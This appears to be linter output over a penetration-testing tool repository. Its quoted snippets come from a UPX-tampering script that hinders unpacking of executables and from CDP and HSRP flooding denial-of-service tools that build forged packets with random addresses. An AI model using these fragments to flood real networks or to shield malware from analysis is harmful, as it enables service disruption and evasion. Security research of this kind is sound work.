    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
121 |         pe.set_dword_at_offset(pos + 20, 0)
122 |         print(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:123:13
    |
121 |         pe.set_dword_at_offset(pos + 20, 0)
122 |         print(
123 |             "\t\t- original file size: ({} / 0x{:x}) => (0)".format(origsize, origsize)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
124 |         )
125 |         pe.set_dword_at_offset(pos + 24, 0)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:126:15
    |
124 |         )
125 |         pe.set_dword_at_offset(pos + 24, 0)
126 |         print("\t\t- filter id: ({} / 0x{:x}) => (0)".format(filter_id, filter_id))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
127 |         pe.set_bytes_at_offset(pos + 28, b"\x00")
128 |         print("\t\t- filter cto: ({} / 0x{:x}) => (0)".format(filter_cto, filter_cto))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:128:15
    |
126 |         print("\t\t- filter id: ({} / 0x{:x}) => (0)".format(filter_id, filter_id))
127 |         pe.set_bytes_at_offset(pos + 28, b"\x00")
128 |         print("\t\t- filter cto: ({} / 0x{:x}) => (0)".format(filter_cto, filter_cto))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
129 |         pe.set_bytes_at_offset(pos + 29, b"\x00")
130 |         print("\t\t- unused: ({} / 0x{:x}) => (0)".format(unused, unused))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:130:15
    |
128 |         print("\t\t- filter cto: ({} / 0x{:x}) => (0)".format(filter_cto, filter_cto))
129 |         pe.set_bytes_at_offset(pos + 29, b"\x00")
130 |         print("\t\t- unused: ({} / 0x{:x}) => (0)".format(unused, unused))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
131 |         pe.set_bytes_at_offset(pos + 30, b"\x00")
132 |         print(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:133:13
    |
131 |           pe.set_bytes_at_offset(pos + 30, b"\x00")
132 |           print(
133 | /             "\t\t- header checksum: ({} / 0x{:x}) => (0)".format(
134 | |                 header_chksum, header_chksum
135 | |             )
    | |_____________^
136 |           )
137 |           pe.set_bytes_at_offset(pos + 31, b"\x00")
    |
help: Convert to f-string

W291 Trailing whitespace
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:156:73
    |
154 |     print(
155 |         """
156 |     :: tamperUpx - a small utility that corrupts UPX-packed executables, 
    |                                                                         ^
157 |     making them much harder to be decompressed & restored.
    |
help: Remove trailing whitespace

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\file-formats\tamperUpx.py:177:9
    |
176 |       if len(outfile) > 0:
177 | /         with open(outfile, "wb") as f:
178 | |             with open(infile, "rb") as g:
    | |_________________________________________^
179 |                   f.write(g.read())
180 |       else:
    |
help: Combine `with` statements

F403 `from scapy.all import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\CDPFlooder.py:22:5
   |
21 | try:
22 |     from scapy.all import *
   |     ^^^^^^^^^^^^^^^^^^^^^^^
23 | except ImportError:
24 |     print("[!] Scapy required: pip install scapy")
   |

N816 Variable `stopThreads` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\CDPFlooder.py:45:1
   |
43 | }
44 |
45 | stopThreads = False
   | ^^^^^^^^^^^
   |

N806 Variable `softVer` in function should be lowercase
  --> security\penetration-testing-tools\networks\CDPFlooder.py:92:5
   |
90 |     #
91 |
92 |     softVer = config["cdp-software-version"][:199]
   |     ^^^^^^^
93 |     platform = config["cdp-platform"][:-4]
94 |     iface = config["cdp-interface"]
   |

N806 Variable `deviceID` in function should be lowercase
  --> security\penetration-testing-tools\networks\CDPFlooder.py:95:5
   |
93 |     platform = config["cdp-platform"][:-4]
94 |     iface = config["cdp-interface"]
95 |     deviceID = cdpDeviceIDgen(8)
   |     ^^^^^^^^
96 |     srcIP = Net(config["source"]).choice()
97 |     caps = random.randint(1, 65)
   |

N806 Variable `srcIP` in function should be lowercase
  --> security\penetration-testing-tools\networks\CDPFlooder.py:96:5
   |
94 |     iface = config["cdp-interface"]
95 |     deviceID = cdpDeviceIDgen(8)
96 |     srcIP = Net(config["source"]).choice()
   |     ^^^^^
97 |     caps = random.randint(1, 65)
   |

F405 `Net` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\networks\CDPFlooder.py:96:13
   |
94 |     iface = config["cdp-interface"]
95 |     deviceID = cdpDeviceIDgen(8)
96 |     srcIP = Net(config["source"]).choice()
   |             ^^^
97 |     caps = random.randint(1, 65)
   |

F405 `Ether` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:99:18
    |
 97 |     caps = random.randint(1, 65)
 98 |
 99 |     etherframe = Ether()  # Start definition of Ethernet Frame
    |                  ^^^^^
100 |     etherframe.dst = "01:00:0c:cc:cc:cc"  # Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
101 |     etherframe.src = RandMAC()  # Set Random source MAC address
    |

F405 `RandMAC` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:101:22
    |
 99 |     etherframe = Ether()  # Start definition of Ethernet Frame
100 |     etherframe.dst = "01:00:0c:cc:cc:cc"  # Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
101 |     etherframe.src = RandMAC()  # Set Random source MAC address
    |                      ^^^^^^^
102 |     etherframe.type = 0x011E  # CDP uses Type field for length information
    |

N806 Variable `llcFrame` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:104:5
    |
102 |     etherframe.type = 0x011E  # CDP uses Type field for length information
103 |
104 |     llcFrame = LLC()  # Start definition of Link Layer Control Frame
    |     ^^^^^^^^
105 |     llcFrame.dsap = 170  # DSAP: SNAP (0xaa) IG Bit: Individual
106 |     llcFrame.ssap = 170  # SSAP: SNAP (0xaa) CR Bit: Command
    |

F405 `LLC` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:104:16
    |
102 |     etherframe.type = 0x011E  # CDP uses Type field for length information
103 |
104 |     llcFrame = LLC()  # Start definition of Link Layer Control Frame
    |                ^^^
105 |     llcFrame.dsap = 170  # DSAP: SNAP (0xaa) IG Bit: Individual
106 |     llcFrame.ssap = 170  # SSAP: SNAP (0xaa) CR Bit: Command
    |

N806 Variable `snapFrame` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:109:5
    |
107 |     llcFrame.ctrl = 3  # Control field Frame Type: Unumbered frame (0x03)
108 |
109 |     snapFrame = SNAP()  # Start definition of SNAP Frame (belongs to LLC Frame)
    |     ^^^^^^^^^
110 |     snapFrame.OUI = 12  # Organization Code: Cisco hex(0x00000c) = int(12)
111 |     snapFrame.code = 8192  # PID (EtherType): CDP hex(0x2000) = int(8192)
    |

F405 `SNAP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:109:17
    |
107 |     llcFrame.ctrl = 3  # Control field Frame Type: Unumbered frame (0x03)
108 |
109 |     snapFrame = SNAP()  # Start definition of SNAP Frame (belongs to LLC Frame)
    |                 ^^^^
110 |     snapFrame.OUI = 12  # Organization Code: Cisco hex(0x00000c) = int(12)
111 |     snapFrame.code = 8192  # PID (EtherType): CDP hex(0x2000) = int(8192)
    |

N806 Variable `cdpHeader` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:113:5
    |
111 |     snapFrame.code = 8192  # PID (EtherType): CDP hex(0x2000) = int(8192)
112 |
113 |     cdpHeader = CDPv2_HDR()  # Start definition of CDPv2 Header
    |     ^^^^^^^^^
114 |     cdpHeader.vers = 1  # CDP Version: 1 - its always 1
115 |     cdpHeader.ttl = 255  # TTL: 255 seconds
    |

F405 `CDPv2_HDR` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:113:17
    |
111 |     snapFrame.code = 8192  # PID (EtherType): CDP hex(0x2000) = int(8192)
112 |
113 |     cdpHeader = CDPv2_HDR()  # Start definition of CDPv2 Header
    |                 ^^^^^^^^^
114 |     cdpHeader.vers = 1  # CDP Version: 1 - its always 1
115 |     cdpHeader.ttl = 255  # TTL: 255 seconds
    |

N806 Variable `cdpDeviceID` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:117:5
    |
115 |     cdpHeader.ttl = 255  # TTL: 255 seconds
116 |
117 |     cdpDeviceID = CDPMsgDeviceID()  # Start definition of CDP Message Device ID
    |     ^^^^^^^^^^^
118 |     cdpDeviceID.type = 1  # Type: Device ID hex(0x0001) = int(1)
119 |     cdpDeviceID.len = 4 + len(
    |

F405 `CDPMsgDeviceID` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:117:19
    |
115 |     cdpHeader.ttl = 255  # TTL: 255 seconds
116 |
117 |     cdpDeviceID = CDPMsgDeviceID()  # Start definition of CDP Message Device ID
    |                   ^^^^^^^^^^^^^^
118 |     cdpDeviceID.type = 1  # Type: Device ID hex(0x0001) = int(1)
119 |     cdpDeviceID.len = 4 + len(
    |

N806 Variable `cdpAddrv4` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:126:5
    |
124 |     )
125 |
126 |     cdpAddrv4 = (
    |     ^^^^^^^^^
127 |         CDPAddrRecordIPv4()
128 |     )  # Start Address Record information for IPv4 belongs to CDP Message Address
    |

F405 `CDPAddrRecordIPv4` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:127:9
    |
126 |     cdpAddrv4 = (
127 |         CDPAddrRecordIPv4()
    |         ^^^^^^^^^^^^^^^^^
128 |     )  # Start Address Record information for IPv4 belongs to CDP Message Address
129 |     cdpAddrv4.ptype = 1  # Address protocol type: NLPID
    |

N806 Variable `cdpAddr` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:137:5
    |
135 |     cdpAddrv4.addr = str(srcIP)  # Generate random source IP address
136 |
137 |     cdpAddr = CDPMsgAddr()  # Start definition of CDP Message Address
    |     ^^^^^^^
138 |     cdpAddr.type = 2  # Type: Address (0x0002)
139 |     cdpAddr.len = 17  # Length: hex(0x0011) = int(17)
    |

F405 `CDPMsgAddr` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:137:15
    |
135 |     cdpAddrv4.addr = str(srcIP)  # Generate random source IP address
136 |
137 |     cdpAddr = CDPMsgAddr()  # Start definition of CDP Message Address
    |               ^^^^^^^^^^
138 |     cdpAddr.type = 2  # Type: Address (0x0002)
139 |     cdpAddr.len = 17  # Length: hex(0x0011) = int(17)
    |

N806 Variable `cdpPortID` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:143:5
    |
141 |     cdpAddr.addr = [cdpAddrv4]  # Pass CDP Address IPv4 information
142 |
143 |     cdpPortID = CDPMsgPortID()  # Start definition of CDP Message Port ID
    |     ^^^^^^^^^
144 |     cdpPortID.type = 3  # type: Port ID (0x0003)
145 |     cdpPortID.len = 4 + len(iface)  # Length: 13
    |

F405 `CDPMsgPortID` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:143:17
    |
141 |     cdpAddr.addr = [cdpAddrv4]  # Pass CDP Address IPv4 information
142 |
143 |     cdpPortID = CDPMsgPortID()  # Start definition of CDP Message Port ID
    |                 ^^^^^^^^^^^^
144 |     cdpPortID.type = 3  # type: Port ID (0x0003)
145 |     cdpPortID.len = 4 + len(iface)  # Length: 13
    |

N806 Variable `cdpCapabilities` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:148:5
    |
146 |     cdpPortID.iface = iface  # Interface string
147 |
148 |     cdpCapabilities = (
    |     ^^^^^^^^^^^^^^^
149 |         CDPMsgCapabilities()
150 |     )  # Start definition of CDP Message Capabilities
    |

F405 `CDPMsgCapabilities` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:149:9
    |
148 |     cdpCapabilities = (
149 |         CDPMsgCapabilities()
    |         ^^^^^^^^^^^^^^^^^^
150 |     )  # Start definition of CDP Message Capabilities
151 |     cdpCapabilities.type = 4  # Type: Capabilities (0x0004)
    |

N806 Variable `cdpSoftVer` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:155:5
    |
153 |     cdpCapabilities.cap = caps  # Capability: Router (0x01), TB Bridge (0x02), SR Bridge (0x04), Switch that provides both Layer 2 anΓÇª
154 |
155 |     cdpSoftVer = (
    |     ^^^^^^^^^^
156 |         CDPMsgSoftwareVersion()
157 |     )  # Start definition of CDP Message Software Version
    |

F405 `CDPMsgSoftwareVersion` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:156:9
    |
155 |     cdpSoftVer = (
156 |         CDPMsgSoftwareVersion()
    |         ^^^^^^^^^^^^^^^^^^^^^
157 |     )  # Start definition of CDP Message Software Version
158 |     cdpSoftVer.type = 5  # Type: Software Version (0x0005)
    |

N806 Variable `cdpPlatform` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:162:5
    |
160 |     cdpSoftVer.val = softVer
161 |
162 |     cdpPlatform = CDPMsgPlatform()  # Statr definition of CDP Message Platform
    |     ^^^^^^^^^^^
163 |     cdpPlatform.type = 6  # Type: Platform (0x0006)
164 |     cdpPlatform.len = 4 + len(platform)  # Length
    |

F405 `CDPMsgPlatform` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:162:19
    |
160 |     cdpSoftVer.val = softVer
161 |
162 |     cdpPlatform = CDPMsgPlatform()  # Statr definition of CDP Message Platform
    |                   ^^^^^^^^^^^^^^
163 |     cdpPlatform.type = 6  # Type: Platform (0x0006)
164 |     cdpPlatform.len = 4 + len(platform)  # Length
    |

N806 Variable `restOfCdp` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:167:5
    |
165 |     cdpPlatform.val = platform  # Platform
166 |
167 |     restOfCdp = (
    |     ^^^^^^^^^
168 |         cdpDeviceID / cdpAddr / cdpPortID / cdpCapabilities / cdpSoftVer / cdpPlatform
169 |     )
    |

N806 Variable `cdpGeneric` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:171:5
    |
169 |     )
170 |
171 |     cdpGeneric = CDPMsgGeneric()
    |     ^^^^^^^^^^
172 |     cdpGeneric.type = 0
173 |     cdpGeneric.len = 0
    |

F405 `CDPMsgGeneric` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:171:18
    |
169 |     )
170 |
171 |     cdpGeneric = CDPMsgGeneric()
    |                  ^^^^^^^^^^^^^
172 |     cdpGeneric.type = 0
173 |     cdpGeneric.len = 0
    |

N806 Variable `cdpGeneric2` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:176:5
    |
174 |     cdpGeneric.val = str(restOfCdp)
175 |
176 |     cdpGeneric2 = CDPMsgGeneric()
    |     ^^^^^^^^^^^
177 |     cdpGeneric2.type = struct.unpack("<H", platform[-4:-2])[0]
178 |     cdpGeneric2.len = struct.unpack("<H", platform[-2:])[0]
    |

F405 `CDPMsgGeneric` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:176:19
    |
174 |     cdpGeneric.val = str(restOfCdp)
175 |
176 |     cdpGeneric2 = CDPMsgGeneric()
    |                   ^^^^^^^^^^^^^
177 |     cdpGeneric2.type = struct.unpack("<H", platform[-4:-2])[0]
178 |     cdpGeneric2.len = struct.unpack("<H", platform[-2:])[0]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\CDPFlooder.py:185:17
    |
184 | def flooder(num, packets):
185 |     Logger.info("Starting task: {}, packets num: {}".format(num, len(packets)))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
186 |     packetsGen = []
187 |     sock = conf.L2socket(iface=config["interface"])
    |
help: Convert to f-string

N806 Variable `packetsGen` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:186:5
    |
184 | def flooder(num, packets):
185 |     Logger.info("Starting task: {}, packets num: {}".format(num, len(packets)))
186 |     packetsGen = []
    |     ^^^^^^^^^^
187 |     sock = conf.L2socket(iface=config["interface"])
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    |

F405 `conf` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:187:12
    |
185 |     Logger.info("Starting task: {}, packets num: {}".format(num, len(packets)))
186 |     packetsGen = []
187 |     sock = conf.L2socket(iface=config["interface"])
    |            ^^^^
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
    |

F405 `socket` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:188:25
    |
186 |     packetsGen = []
187 |     sock = conf.L2socket(iface=config["interface"])
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    |                         ^^^^^^
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
    |

F405 `socket` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:188:44
    |
186 |     packetsGen = []
187 |     sock = conf.L2socket(iface=config["interface"])
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    |                                            ^^^^^^
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
    |

F405 `socket` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:189:25
    |
187 |     sock = conf.L2socket(iface=config["interface"])
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
    |                         ^^^^^^
190 |
191 |     for i in range(512):
    |

F405 `socket` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:189:44
    |
187 |     sock = conf.L2socket(iface=config["interface"])
188 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
    |                                            ^^^^^^
190 |
191 |     for i in range(512):
    |

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\networks\CDPFlooder.py:191:9
    |
189 |     sock.ins.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 512)
190 |
191 |     for i in range(512):
    |         ^
192 |         packetsGen.append(generatePacket())
    |
help: Rename unused `i` to `_i`

E712 Avoid inequality comparisons to `True`; use `not stopThreads:` for false checks
   --> security\penetration-testing-tools\networks\CDPFlooder.py:195:15
    |
194 |     if len(packets) == 0:
195 |         while stopThreads != True:
    |               ^^^^^^^^^^^^^^^^^^^
196 |             try:
197 |                 for p in packetsGen:
    |
help: Replace with `not stopThreads`

B007 Loop control variable `p` not used within loop body
   --> security\penetration-testing-tools\networks\CDPFlooder.py:204:13
    |
202 |                 break
203 |     else:
204 |         for p in packets:
    |             ^
205 |             if stopThreads:
206 |                 break
    |
help: Rename unused `p` to `_p`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\CDPFlooder.py:215:17
    |
213 |                 break
214 |
215 |     Logger.info("Stopping task: {}".format(num))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
216 |     sock.close()
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\CDPFlooder.py:223:9
    |
222 |       print(
223 | /         """
224 | |         :: CDP Flooding / Denial of Service tool
225 | |         Floods the interface with fake, randomly generated CDP packets.
226 | |         Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
227 | |         v{}
228 | | """.format(
229 | |             VERSION
230 | |         )
    | |_________^
231 |       )
    |
help: Convert to f-string

F405 `os` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:296:8
    |
294 |         return False
295 |
296 |     if os.getuid() != 0:
    |        ^^
297 |         Logger.err("This program must be run as root.")
298 |         return False
    |

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:300:5
    |
298 |         return False
299 |
300 |     load_contrib("cdp")
    |     ^^^^^^^^^^^^
301 |
302 |     packetsLists = [[] for x in range(config["processors"])]
    |

N806 Variable `packetsLists` in function should be lowercase
   --> security\penetration-testing-tools\networks\CDPFlooder.py:302:5
    |
300 |     load_contrib("cdp")
301 |
302 |     packetsLists = [[] for x in range(config["processors"])]
    |     ^^^^^^^^^^^^
303 |
304 |     if config["packets"] > 0:
    |

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\CDPFlooder.py:325:5
    |
324 |     stopThreads = True
325 |     time.sleep(3)
    |     ^^^^
    |

F401 [*] `random` imported but unused
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:15:8
   |
13 | import fcntl
14 | import multiprocessing
15 | import random
   |        ^^^^^^
16 | import socket
17 | import string
   |
help: Remove unused import: `random`

F401 [*] `string` imported but unused
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:17:8
   |
15 | import random
16 | import socket
17 | import string
   |        ^^^^^^
18 | import struct
19 | import sys
   |
help: Remove unused import: `string`

F403 `from scapy.all import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:22:5
   |
21 | try:
22 |     from scapy.all import *
   |     ^^^^^^^^^^^^^^^^^^^^^^^
23 | except ImportError:
24 |     print("[!] Scapy required: pip install scapy")
   |

N816 Variable `stopThreads` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:42:1
   |
40 | }
41 |
42 | stopThreads = False
   | ^^^^^^^^^^^
   |

F405 `IP` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:78:10
   |
77 | def generatePacket():
78 |     ip = IP()
   |          ^^
79 |     ip.src = config["source-ip"]
80 |     ip.dst = config["dest-ip"]
   |

F405 `UDP` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:82:11
   |
80 |     ip.dst = config["dest-ip"]
81 |
82 |     udp = UDP()
   |           ^^^
83 |     udp.sport = 1985
84 |     udp.dport = 1985
   |

F405 `HSRP` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\networks\HSRPFlooder.py:86:12
   |
84 |     udp.dport = 1985
85 |
86 |     hsrp = HSRP()
   |            ^^^^
87 |     hsrp.version = 0
88 |     hsrp.opcode = 1
   |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:99:17
    |
 98 | def flooder(num):
 99 |     Logger.info("Starting task: {}".format(num))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
100 |
101 |     while stopThreads != True:
    |
help: Convert to f-string

E712 Avoid inequality comparisons to `True`; use `not stopThreads:` for false checks
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:101:11
    |
 99 |     Logger.info("Starting task: {}".format(num))
100 |
101 |     while stopThreads != True:
    |           ^^^^^^^^^^^^^^^^^^^
102 |         try:
103 |             p = generatePacket()
    |
help: Replace with `not stopThreads`

F405 `send` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:106:13
    |
104 |             if stopThreads:
105 |                 raise KeyboardInterrupt
106 |             send(p, verbose=config["verbose"], iface=config["interface"])
    |             ^^^^
107 |         except KeyboardInterrupt:
108 |             break
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:110:17
    |
108 |             break
109 |
110 |     Logger.info("Stopping task: {}".format(num))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:126:9
    |
125 |       print(
126 | /         """
127 | |         :: HSRP Flooding / Denial of Service tool
128 | |         Floods the interface with Active router Coup HSRP packets.
129 | |         Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
130 | |         v{}
131 | | """.format(
132 | |             VERSION
133 | |         )
    | |_________^
134 |       )
    |
help: Convert to f-string

F405 `os` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:205:8
    |
203 |         return False
204 |
205 |     if os.getuid() != 0:
    |        ^^
206 |         Logger.err("This program must be run as root.")
207 |         return False
    |

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\HSRPFlooder.py:229:5
    |
228 |     stopThreads = True
229 |     time.sleep(3)
    |     ^^^^
    |

F401 [*] `json` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:14:8
   |
13 | import argparse
14 | import json
   |        ^^^^
15 | import os
16 | import random
   |
help: Remove unused import: `json`

F401 [*] `os` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:15:8
   |
13 | import argparse
14 | import json
15 | import os
   |        ^^
16 | import random
17 | import re
   |
help: Remove unused import: `os`

F401 [*] `random` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:16:8
   |
14 | import json
15 | import os
16 | import random
   |        ^^^^^^
17 | import re
18 | import socket
   |
help: Remove unused import: `random`

F401 [*] `re` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:17:8
   |
15 | import os
16 | import random
17 | import re
   |        ^^
18 | import socket
19 | import string
   |
help: Remove unused import: `re`

F401 [*] `string` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:19:8
   |
17 | import re
18 | import socket
19 | import string
   |        ^^^^^^
20 | import sys
21 | import time
   |
help: Remove unused import: `string`

F401 [*] `urllib` imported but unused
  --> security\penetration-testing-tools\networks\RandMyProxy.py:22:8
   |
20 | import sys
21 | import time
22 | import urllib
   |        ^^^^^^
23 |
24 | import requests
   |
help: Remove unused import: `urllib`

N816 Variable `gimmeProxyURL` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\RandMyProxy.py:56:1
   |
54 | }
55 |
56 | gimmeProxyURL = "https://gimmeproxy.com/api/getProxy"
   | ^^^^^^^^^^^^^
57 | proxydbURL = "http://proxydb.net/?anonlvl=2&anonlvl=3&anonlvl=4"
   |

N816 Variable `proxydbURL` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\RandMyProxy.py:57:1
   |
56 | gimmeProxyURL = "https://gimmeproxy.com/api/getProxy"
57 | proxydbURL = "http://proxydb.net/?anonlvl=2&anonlvl=3&anonlvl=4"
   | ^^^^^^^^^^
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:98:13
    |
 97 |         if (
 98 |             "protocol" in out.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^
 99 |             and "ip" in out.keys()
100 |             and "port" in out.keys()
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:99:17
    |
 97 |         if (
 98 |             "protocol" in out.keys()
 99 |             and "ip" in out.keys()
    |                 ^^^^^^^^^^^^^^^^^^
100 |             and "port" in out.keys()
101 |             and "country" in out.keys()
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:100:17
    |
 98 |             "protocol" in out.keys()
 99 |             and "ip" in out.keys()
100 |             and "port" in out.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^
101 |             and "country" in out.keys()
102 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:101:17
    |
 99 |             and "ip" in out.keys()
100 |             and "port" in out.keys()
101 |             and "country" in out.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^
102 |         ):
103 |             verbose(f"Got proxy: {out['protocol']} {out['ip']}:{out['port']}")
    |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\networks\RandMyProxy.py:129:13
    |
127 |         s.close()
128 |
129 |         dbg(f"Proxy validated.")
    |             ^^^^^^^^^^^^^^^^^^^
130 |         return True
    |
help: Remove extraneous `f` prefix

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RandMyProxy.py:183:11
    |
181 |       global config
182 |
183 |       out = """
    |  ___________^
184 | |         :: RandMyProxy.py
185 | |         Acquires random, alive proxies based on input criterias
186 | |         Mariusz Banach / mgeeky '22, <mb@binary-offensive.com>
187 | |         v{}
188 | |
189 | | """.format(
190 | |         VERSION
191 | |     )
    | |_____^
192 |
193 |       parser = argparse.ArgumentParser(prog=argv[0], usage="%(prog)s [options]")
    |
